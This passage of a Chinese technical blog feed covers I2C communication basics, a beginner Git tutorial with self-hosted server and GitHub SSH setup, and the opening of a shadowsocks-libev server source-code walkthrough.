id="4-通信过程"><a href="#4-通信过程" class="headerlink" title="4.通信过程"></a>4.通信过程</h5><p>(1)起始信号后，总线上所有的从机开始等待主机紧接下来的从机地址广播。因为总线上每个设备的地址都是唯一的，当主机广播的地址与某个设备地址相同时，该设备就被选中，并向主机发出应答(ACK)或者非应答(NACK)，主机只有在接收到应答信号后继续发送&#x2F;接收数据，没选中的设备将会忽略之后的数据信号。根据I2C协议，从机地址可以是7位或者10位。</p><p>(2)I2C总线上传输的数据包括上述的地址信号，又包括真正的数据信号。在起始信号后需传送一个从机地址(7位)，第8位是数据的传输方向(接收&#x2F;发送)，“0”表示主机发送数据，“1”表示主机接收数据。每次数据的传输总是由主机产生结束信号以结束传输，但若主机希望继续占用总线进行新的数据传输时，则可以不产生结束信号，而是再次发送起始信号对另一从机地址寻址。</p><p>(3)若配置为写数据方向，主机开始向从机传输数据，数据包大小为8位，主机每发送完1字节数据都有等到从机的应答信号(ACK)，多字节数据发送时重复此过程。传输结束后，主机向从机发送一个停止信号表不再传输数据。</p><p>(4)若配置为读方向，从机开始向主机返回数据，数据包大小还是8位。同理，从机每发送完一字节数据都要等到主机的应答信号(ACK)，重复此过程可以返回多个数据。当主机希望停止接收数据时就向返回一个非应答信号(NACK)，数据传输将结束。</p><p>(5) 实际I2C通讯采用的是读写复合的格式。传输过程中主机需要发出2次起始信号：第一次传输主机通过从机地址找到从机设备，发送一段数据，这个数据是从设备内部寄存器或者存储器地址；第二次传输是对该地址进行读&#x2F;写。主机要读取从机数据时，主机会释放对SDA总线的控制，由从机控制SDA总线，主机负责接收信号；主机要向从机设备写数据时，SDA由主机控制，从机负责接收信号。</p><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4.小结"></a>4.小结</h3><p>I2C是嵌入式开发中最常用地协议之一，经常使用在控制板和显示屏进行通讯，以及主机和从机进行通讯中。</p><p>原文链接：<a href="https://blog.csdn.net/qq_29344757/article/details/76520378">https://blog.csdn.net/qq_29344757/article/details/76520378</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 嵌入式基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git使用入门</title>
      <link href="/2022/12/20/Git%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
      <url>/2022/12/20/Git%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Git使用入门"><a href="#Git使用入门" class="headerlink" title="Git使用入门"></a>Git使用入门</h1><h3 id="1-什么是Git？"><a href="#1-什么是Git？" class="headerlink" title="1.什么是Git？"></a>1.什么是Git？</h3><p>Git是一个强大的分布式版本控制工具，最初由linus管理linux内核项目时开发，在项目开发的时候使用git可以存储代码、跟踪修订历史记录、合并代码更改，并在需要时恢复为较早的代码版本。</p><h3 id="2-Git的三个概念"><a href="#2-Git的三个概念" class="headerlink" title="2.Git的三个概念"></a>2.Git的三个概念</h3><h6 id="1-工作区"><a href="#1-工作区" class="headerlink" title="1.工作区"></a>1.工作区</h6><p>实际开发中能在git仓库目录下看到的目录</p><h6 id="2-暂存区"><a href="#2-暂存区" class="headerlink" title="2.暂存区"></a>2.暂存区</h6><p>英文叫 stage 或 index。一般存放在 .git 目录下的 index 文件（.git&#x2F;index）中，所以我们把暂存区有时也叫作索引（index）。</p><h6 id="3-版本库"><a href="#3-版本库" class="headerlink" title="3.版本库"></a>3.版本库</h6><p>工作区有一个隐藏目录 .git，这个不算工作区，而是 Git 的版本库。</p><h3 id="3-安装git"><a href="#3-安装git" class="headerlink" title="3.安装git"></a>3.安装git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在ubuntu/debian上可以使用以下命令来安装git</span></span><br><span class="line">sudo apt install git</span><br><span class="line"><span class="comment">#基于archlinux </span></span><br><span class="line">sudo pacman -S git</span><br></pre></td></tr></table></figure><h3 id="4-配置git"><a href="#4-配置git" class="headerlink" title="4.配置git"></a>4.配置git</h3><p>git在使用之前需要初始化一些配置信息包括姓名和邮箱，用于日后管理项目提交commit时能很明显的看到是谁提交的commit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;DreamAccount&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;fragmented666@gmail.com&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-git常用的命令"><a href="#5-git常用的命令" class="headerlink" title="5.git常用的命令"></a>5.git常用的命令</h3><h5 id="1-初始化git仓库"><a href="#1-初始化git仓库" class="headerlink" title="1.初始化git仓库"></a>1.初始化git仓库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init git-repo-name <span class="comment">#将git-repo-name替换成自己需要创建的git项目仓库的名字</span></span><br></pre></td></tr></table></figure><h5 id="2-提交代码"><a href="#2-提交代码" class="headerlink" title="2.提交代码"></a>2.提交代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将代码从工作区加入到暂存区</span></span><br><span class="line">git add . </span><br><span class="line"><span class="comment">#将代码从暂存区加入到版本库</span></span><br><span class="line">git commit -m <span class="string">&quot;update&quot;</span></span><br></pre></td></tr></table></figure><h5 id="3-回退版本"><a href="#3-回退版本" class="headerlink" title="3.回退版本"></a>3.回退版本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#舍弃当前提交，回滚到指定的版本上</span></span><br><span class="line">git reset --hard <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将之前提交的代码从版本库重新放到暂存区</span></span><br><span class="line">git reset --soft <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将之前提交的代码重新放到暂存区</span></span><br><span class="line">git reset --mixed <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将暂存区的代码重新放到工作区</span></span><br><span class="line">git reset .</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定一个版本进行重做</span></span><br><span class="line">git revert <span class="built_in">id</span></span><br></pre></td></tr></table></figure><h5 id="4-git分支操作"><a href="#4-git分支操作" class="headerlink" title="4.git分支操作"></a>4.git分支操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前分支</span></span><br><span class="line">git branch </span><br><span class="line"></span><br><span class="line"><span class="comment">#基于当前分支创建一个新的分支</span></span><br><span class="line">git branch <span class="variable">$&#123;BRANCH_NAME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个分支将切换到该分支下</span></span><br><span class="line">git checkout -b <span class="variable">$&#123;BRANCH_NAME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切换分支</span></span><br><span class="line">git checkout <span class="variable">$&#123;BRANCH_NAME&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="5-git远程操作"><a href="#5-git远程操作" class="headerlink" title="5.git远程操作"></a>5.git远程操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看git远程主机的信息</span></span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加远程主机</span></span><br><span class="line"><span class="comment">#git remote add &lt;远程主机名&gt; &lt;代码仓库地址&gt;</span></span><br><span class="line">git remote add origin https://github.com/DreamAccout/monitor.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除远程分支</span></span><br><span class="line"><span class="comment">#git push &lt;远程主机名&gt; --delete &lt;远程分支名&gt;</span></span><br><span class="line">git push origin --delete remoteBranchName</span><br><span class="line"></span><br><span class="line"><span class="comment">#推送到本地分支到远程分支(如果改远程分支不存在则进行创建)</span></span><br><span class="line"><span class="comment">#git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span></span><br><span class="line">git push -u origin master:master</span><br><span class="line"></span><br><span class="line"><span class="comment">#将远程分支克隆到本地</span></span><br><span class="line"><span class="comment">#git fetch &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span></span><br><span class="line">git fetch origin master:dev</span><br><span class="line"></span><br><span class="line"><span class="comment">#将远程分支合并到本地相当于git fetch &amp;&amp; git merge</span></span><br><span class="line"><span class="comment">#git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span></span><br><span class="line">git pull origin master:dev</span><br><span class="line"></span><br><span class="line"><span class="comment">#克隆一个远程仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/DreamAccount/monitor.git</span><br></pre></td></tr></table></figure><h5 id="6-git冲突解决"><a href="#6-git冲突解决" class="headerlink" title="6.git冲突解决"></a>6.git冲突解决</h5><p>在实际开发中,可能会存在以下情况，开发者在分支master上修改了文件a并将文件a提交到了代码仓库中,同时开发者在dev分支上也修改了文件a,这个时候如果我们在其中一个分支上合并另一个分支，这个时候就会引发冲突,因为git不知道我们实际要保留哪个修改记录,这个时候就需要开发者自行修改，然后重新git add . &amp;&amp; git commit -m “update“重新提交代码。<br>实际冲突的文件git将会用标识符进行标记</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; <span class="string">HEAD</span></span><br><span class="line"><span class="string">        //我是dev分支的修改记录</span></span><br><span class="line"><span class="string">=======</span></span><br><span class="line"><span class="string">//我是master分支的修改记录</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;&gt;&gt;&gt;&gt; master</span></span><br><span class="line"><span class="string">#&lt;&lt;&lt;&lt;&lt;到=====是当前分支修改的内容</span></span><br><span class="line"><span class="string">#=====到&gt;&gt;&gt;&gt;&gt;&gt;是合并分支修改的内容</span></span><br></pre></td></tr></table></figure><h5 id="7-git-rebase用法"><a href="#7-git-rebase用法" class="headerlink" title="7.git rebase用法"></a>7.git rebase用法</h5><p>在开发过程中我们可能会出现代码提交历史太多，有很多个版本只进行了小的修改，这个时候我们经常会将多个提交历史进行合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将当前版本往前三个版本提交历史记录进行合并。</span></span><br><span class="line">git rebase -i HEAD~3</span><br></pre></td></tr></table></figure><p>有的时候我们如果合并一个分支会出现git提交历史记录变得分叉，显得十分不美观，这个时候就可以使用git rebase命令,将另一个分支的提交记录复制到本分支上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase dev</span><br></pre></td></tr></table></figure><h5 id="8-如何保存当前工作状态"><a href="#8-如何保存当前工作状态" class="headerlink" title="8.如何保存当前工作状态"></a>8.如何保存当前工作状态</h5><p>在实际的开发中,常常会出现这样的场景，你正在dev分支上开发项目,这个时候有个人和你说主线master上存在bug需要立马修复，这个时候你又不想提交代码，但是你不提交代码这个时候切换到master分支上你会发现master分支上也存在你加入到暂存区和工作区的代码，这个时候我们就需要用git stash 将工作区和暂存区的代码隐藏保存起来(官网是这样说的，但是实际上只能保存暂存区的代码,如果需要保存工作区的代码需要指定-u参数)，保存成功后再切换到master分支上修复bug。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将当前暂存区和工作去的文件进行隐藏保存</span></span><br><span class="line">git stash save <span class="string">&quot;stash file&quot;</span> -u</span><br><span class="line"></span><br><span class="line"><span class="comment">#将指定保存的文件进行恢复</span></span><br><span class="line">git stash pop <span class="comment">#默认使用最近一个进行恢复</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="9-git-reset和git-revert的区别"><a href="#9-git-reset和git-revert的区别" class="headerlink" title="9.git reset和git revert的区别"></a>9.git reset和git revert的区别</h5><p>git reset是回滚到指定的版本，并将指定版本后面的记录全部舍弃，但是git revert是指定一个版本进行重做，并不影响后面的版本，如果后面的版本对回退的版本提交文件也进行了修改，则revert就会引发冲突。</p><h3 id="6-搭建git服务器"><a href="#6-搭建git服务器" class="headerlink" title="6.搭建git服务器"></a>6.搭建git服务器</h3><h5 id="1-创建一个git用户"><a href="#1-创建一个git用户" class="headerlink" title="1.创建一个git用户"></a>1.创建一个git用户</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -k /dev/null -s /usr/bin/git-shell git</span><br></pre></td></tr></table></figure><h5 id="2-配置密钥"><a href="#2-配置密钥" class="headerlink" title="2.配置密钥"></a>2.配置密钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成密钥</span></span><br><span class="line">ssh-keygen -t rsa -b 2048 -C <span class="string">&quot;git-repo key&quot;</span> -f git-repo</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥配置到git用户的ssh验证密钥</span></span><br><span class="line">sudo <span class="built_in">cat</span> git-repo.pub &gt; /home/git/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#将私钥保留在本地</span></span><br></pre></td></tr></table></figure><h5 id="3-指定一个目录为git仓库目录"><a href="#3-指定一个目录为git仓库目录" class="headerlink" title="3.指定一个目录为git仓库目录"></a>3.指定一个目录为git仓库目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里使用/srv/git-repo为git仓库目录</span></span><br><span class="line"><span class="comment">#将该目录的权限设为git用户</span></span><br><span class="line">sudo <span class="built_in">chown</span> git:git /srv/git=repo -R</span><br></pre></td></tr></table></figure><h5 id="4-创建一个远程git仓库"><a href="#4-创建一个远程git仓库" class="headerlink" title="4.创建一个远程git仓库"></a>4.创建一个远程git仓库</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个裸库</span></span><br><span class="line">git init --bare monitor.git <span class="comment">#将monitor.git换成自己的目录</span></span><br></pre></td></tr></table></figure><h5 id="5-将远程仓库克隆到本地"><a href="#5-将远程仓库克隆到本地" class="headerlink" title="5.将远程仓库克隆到本地"></a>5.将远程仓库克隆到本地</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在这之前你必须要先配置好私钥</span></span><br><span class="line">git <span class="built_in">clone</span> git@example.com:/home/git/monitor.git</span><br></pre></td></tr></table></figure><h3 id="7-配置github为远程仓库"><a href="#7-配置github为远程仓库" class="headerlink" title="7.配置github为远程仓库"></a>7.配置github为远程仓库</h3><p>1.将生成的私钥保留到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将生成的私钥复制到.ssh目录下。</span></span><br><span class="line"><span class="comment">#生成的ssh密钥一般会自动在.ssh目录下，这个时候只需要将公钥id_rsa.pub上传到github上即可</span></span><br><span class="line"><span class="comment">#编辑.ssh/config (如果没有直接创建)</span></span><br><span class="line">Host github <span class="comment">#模板的名称</span></span><br><span class="line">        Hostname github.com <span class="comment">#指定的远程主机名</span></span><br><span class="line">        Port 22 <span class="comment">#指定的ssh端口</span></span><br><span class="line">        User git <span class="comment">#指定的登录的用户</span></span><br><span class="line">        Identityfile ~/.ssh/private_keys/github <span class="comment">#指定的登录的私钥，根据实际情况进行修改</span></span><br></pre></td></tr></table></figure><p>2.将生成的公钥上传到github中<br><img src="/images/github.png" alt="配置公钥到github"></p><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh -T github</span><br><span class="line"><span class="comment">#如果成功会出现以下提示</span></span><br><span class="line">Hi DreamAccount! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#如果配置了ssh模板可以直接</span></span><br><span class="line"><span class="string">ssh -T github(配置模板的名称)</span></span><br></pre></td></tr></table></figure><p>4.创建github远程仓库<br><img src="/images/github-create.png" alt="github remote repository"><br>5.克隆远程仓库到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> github:DreamAccount/monitor.git<span class="comment">#将DreamAccount替换成自己的用户名，monitor替换成自己的仓库名。</span></span><br></pre></td></tr></table></figure><p>如果需要将代码推送到github上，先将代码进行提交到版本仓库只需要git push即可<br>例如我有一堆代码存放在dir目录下,如果需要将代码拷贝到刚刚克隆下的仓库，然后提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> <span class="built_in">dir</span>/* monitor/</span><br><span class="line"><span class="built_in">cd</span> monitor &amp;&amp; git add . &amp;&amp; git commit -m <span class="string">&quot;update release &quot;</span> &amp;&amp; git push</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsocks-libev源码分析</title>
      <link href="/2022/11/29/shadowsocks-libev%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/29/shadowsocks-libev%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="shadowsocks-libev源码分析"><a href="#shadowsocks-libev源码分析" class="headerlink" title="shadowsocks-libev源码分析"></a>shadowsocks-libev源码分析</h1><h3 id="1-什么是shadowsocks"><a href="#1-什么是shadowsocks" class="headerlink" title="1.什么是shadowsocks?"></a>1.什么是shadowsocks?</h3><p><a href="(https://shadowsocks.org/">shadowsocks-libev</a>是一个轻量的socks5代理,可用于伪装ip访问服务器,底层基于libev事件驱动库,非常轻量高效</p><h3 id="2-shadowsocks协议解析"><a href="#2-shadowsocks协议解析" class="headerlink" title="2.shadowsocks协议解析"></a>2.shadowsocks协议解析</h3><table><thead><tr><th align="center"></th><th>类型</th><th>目标ip地址</th><th>目标端口</th><th>数据</th></tr></thead><tbody><tr><td align="center">长度(Byte)</td><td>1</td><td>可变</td><td>2</td><td>可变</td></tr></tbody></table><p>ATYP: 协议类型</p><pre><code>        * 0x01 ipv4的ip地址        * 0x03 域名        * 0x04 ipv6的ip地址</code></pre><p>当目标服务器使用域名时</p><table><thead><tr><th></th><th>类型</th><th>域名长度</th><th>域名</th><th>目标端口</th><th>数据</th></tr></thead><tbody><tr><td>长度(Byte)</td><td>1</td><td>1</td><td>2</td><td>2</td><td>可变</td></tr></tbody></table><h3 id="3-shadowsocks-libev核心文件"><a href="#3-shadowsocks-libev核心文件" class="headerlink" title="3.shadowsocks-libev核心文件"></a>3.shadowsocks-libev核心文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss-server <span class="comment">#服务端运行程序</span></span><br><span class="line">ss-local<span class="comment">#客户端运行文程序</span></span><br></pre></td></tr></table></figure><h3 id="4-shadowsocks-libev源码解析"><a href="#4-shadowsocks-libev源码解析" class="headerlink" title="4.shadowsocks-libev源码解析"></a>4.shadowsocks-libev源码解析</h3><p>shadowsocks-libev分为客户端和服务端,因此我们需要两份代码,一个客户端代码一个服务段代码。</p><h4 id="4-1-ss-server-服务端"><a href="#4-1-ss-server-服务端" class="headerlink" title="4.1.ss-server(服务端)"></a>4.1.ss-server(服务端)</h4><p>1.我们先看shadowsocks-libev ss-server服务端程序开始监听客户端连接的程序代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mode != UDP_ONLY) &#123;</span><br><span class="line">        <span class="type">int</span> num_listen_ctx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; server_num; i++) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span> *host = server_addr[i].host;</span><br><span class="line">            <span class="type">const</span> <span class="type">char</span> *port = server_addr[i].port ? server_addr[i].port : server_port;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (plugin != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                host = plugin_host;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (host &amp;&amp; ss_is_ipv6addr(host))</span><br><span class="line">                LOGI(<span class="string">&quot;tcp server listening at [%s]:%s&quot;</span>, host, port);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                LOGI(<span class="string">&quot;tcp server listening at %s:%s&quot;</span>, host ? host : <span class="string">&quot;0.0.0.0&quot;</span>, port);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Bind to port</span></span><br><span class="line">            <span class="type">int</span> listenfd;</span><br><span class="line">            listenfd = create_and_bind(host, port, mptcp);</span><br><span class="line">            <span class="keyword">if</span> (listenfd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (listen(listenfd, SSMAXCONN) == <span class="number">-1</span>) &#123;</span><br><span class="line">                ERROR(<span class="string">&quot;listen()&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            setfastopen(listenfd);</span><br><span class="line">            setnonblocking(listenfd);</span><br><span class="line">            <span class="type">listen_ctx_t</span> *listen_ctx = &amp;listen_ctx_list[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Setup proxy context</span></span><br><span class="line">            listen_ctx-&gt;timeout = atoi(timeout);</span><br><span class="line">            listen_ctx-&gt;fd      = listenfd;</span><br><span class="line">            listen_ctx-&gt;iface   = iface;</span><br><span class="line">            listen_ctx-&gt;loop    = loop;</span><br><span class="line"></span><br><span class="line">            ev_io_init(&amp;listen_ctx-&gt;io, accept_cb, listenfd, EV_READ);</span><br><span class="line">            <span class="comment">//开始监听客户端的连接，accept_cb为ss-server接受客户端请求连接的回调函数</span></span><br><span class="line">            ev_io_start(loop, &amp;listen_ctx-&gt;io);</span><br><span class="line"></span><br><span class="line">            num_listen_ctx++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (plugin != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (num_listen_ctx == <span class="number">0</span>) &#123;</span><br><span class="line">            FATAL(<span class="string">&quot;failed to listen on any address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到这里服务端绑定本机接口并开始监听,等待来自客户端的连接。</p><p>2.我们来看看客户端连接ss-server 后的回调函数accept_cb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">listen_ctx_t</span> *listener = (<span class="type">listen_ctx_t</span> *)w;</span><br><span class="line">    <span class="type">int</span> serverfd           = accept(listener-&gt;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (serverfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        ERROR(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="type">server_t</span> *server = new_server(serverfd, listener);</span><br><span class="line">    ev_io_start(EV_A_ &amp; server-&gt;recv_ctx-&gt;io);</span><br></pre></td></tr></table></figure><p>这里回调函数accept_cb函数调用了我们常用的accept函数接收客户端的连接,得到和客户端数据交互的socket,并使用new_server函数创建了一个新的任务,开始等待接收客户端发来的数据</p><p>3.我们继续看new_server函数干了什么?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">server_t</span> *</span><br><span class="line"><span class="title function_">new_server</span><span class="params">(<span class="type">int</span> fd, <span class="type">listen_ctx_t</span> *listener)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">        server_conn++;</span><br><span class="line">        LOGI(<span class="string">&quot;new connection from client, %d opened client connections&quot;</span>, server_conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">server_t</span> *server;</span><br><span class="line">    server = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(server, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">server_t</span>));</span><br><span class="line"></span><br><span class="line">    server-&gt;recv_ctx = ss_malloc(<span class="keyword">sizeof</span>(<span class="type">server_ctx_t</span>));</span><br><span class="line">    